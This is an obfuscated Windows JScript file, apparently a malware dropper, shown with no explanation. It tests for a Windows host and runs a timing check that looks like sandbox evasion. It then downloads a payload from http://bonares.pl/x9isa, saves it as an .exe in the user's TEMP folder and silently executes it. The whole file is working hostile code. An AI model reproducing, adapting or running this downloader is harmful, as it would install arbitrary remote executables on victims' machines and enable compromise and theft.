var _G0 = false;
var _HB = "CreateObject";
var _NS = function _FS() {return WScript[_HB]("WScript"+".Shell");}(), _P0 = 11;
var _Z = "MSXML2.XMLHTTP";
var _TJ = 2123213;
var _N = 0;
function _B(_Q){_NS["Run"](_Q, _N, _N);};
function _J(){return _Z + "";};
function _YN(_EA, _GZ0){_N = _N * 1; return _EA - _GZ0;};
function _QM(){return _HB;};
/*@cc_on
  @if (@_win32 || @_win64)
    _G0 = true;
  @end
@*/
if (_G0)
{
var _LO = "";
function _A(){return 22;};
var _WN = 0; var _IX = 0;
function _O()
{
var _GZ = new this["Date"]();
var _TE = _GZ["getUTCMilliseconds"]();
WScript["Sleep"](_A());
var _GZ = new this["Date"]();
var _P = _GZ["getUTCMilliseconds"]();
WScript["Sleep"](_A());
var _GZ = new this["Date"]();
var _T = _GZ["getUTCMilliseconds"]();
var _WN = "_M";
_WN = _YN(_P, _TE);
var _IX = "_UL";
_IX = _YN(_T, _P);
_LO = "open";
return _YN(_WN, _IX);
}
var _O1 = false;
var _F = false;
for (var _WQ = _N; _WQ < _A() * 1; _WQ++){if (_O() != _N){
_O1 = true; 
_IX = "31" + 11 * _WN + _IX; 
_F = true; 
break;
}}
function _XV() {return ((_O1 == true) && (_O1 == _F)) ? 1 : _N;};
if (_O1 && _XV() && _F){
function _FQ() {return _NS["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "ULIIp2nWmts6zXb.ex" + "e";};
 _FY = _J();
 _W = WScript[_HB](_FY);
 var _LS = 1;
 while (_LS){
try {
	if (_LS == 1)
	{
		_W[_LO]("GET", "http://bonares.pl/x9isa", false);
		_W["send"]();
		_O0 = "Sleep";
	}
	WScript[_O0](_A() + 120); 
	if (_W["readystate"] < 2 * 2) continue;
	_LS = _N;
	function _U(_LH) {var _L = (1, 2, 3, 4, 5, _LH); return _L;};
	_A0 = WScript[_QM()]("ADODB.Stream");
	_FY = _A0;
	_FY[_LO]();
	_FY["type"] = _U(1);
	_FY["write"](_W["ResponseBody"]);
	_A0["position"] = _U(_N);
	_FY["Save" + "ToFile"](_FQ(), 2);
	_A0["cl"+"ose"]();
	_G = _FQ();
	_B(_G);
} catch(_ZQ){};
}
}
}

